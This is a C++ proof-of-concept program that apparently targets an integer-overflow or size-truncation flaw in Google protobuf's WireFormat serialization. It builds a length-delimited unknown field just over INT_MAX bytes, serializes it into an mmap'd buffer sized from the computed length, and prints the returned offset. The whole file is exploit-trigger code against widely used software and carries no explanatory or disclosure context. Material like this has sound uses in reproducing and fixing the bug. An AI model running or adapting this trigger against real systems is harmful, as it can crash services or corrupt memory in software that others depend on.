#include <cerrno>
#include <climits>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <limits>
#include <string>
#include <utility>

#include <sys/mman.h>

#include "google/protobuf/unknown_field_set.h"
#include "google/protobuf/wire_format.h"

int main() {
  using google::protobuf::UnknownFieldSet;
  using google::protobuf::internal::WireFormat;

  const size_t payload_size = static_cast<size_t>(INT_MAX) + 256;
  std::cout << "[*] payload_size=" << payload_size << "\n";
  std::cout << "[*] INT_MAX=" << INT_MAX << "\n";

  std::string payload;
  try {
    payload.resize(payload_size, 'A');
  } catch (const std::bad_alloc& e) {
    std::cerr << "[!] payload allocation failed: " << e.what() << "\n";
    return 2;
  }

  UnknownFieldSet unknown_fields;
  unknown_fields.AddLengthDelimited(1, std::move(payload));

  const size_t computed_size =
      WireFormat::ComputeUnknownFieldsSize(unknown_fields);
  std::cout << "[*] computed_size=" << computed_size << "\n";

  void* mapping =
      mmap(nullptr, computed_size, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANON, -1, 0);
  if (mapping == MAP_FAILED) {
    std::cerr << "[!] mmap failed: " << std::strerror(errno) << "\n";
    return 3;
  }

  std::cout << "[*] serializing through WireFormat::SerializeUnknownFieldsToArray\n";
  uint8_t* target = static_cast<uint8_t*>(mapping);
  uint8_t* end = WireFormat::SerializeUnknownFieldsToArray(unknown_fields, target);

  std::ptrdiff_t written = end - target;
  std::cout << "[*] returned_offset=" << written << "\n";

  munmap(mapping, computed_size);
  return 0;
}
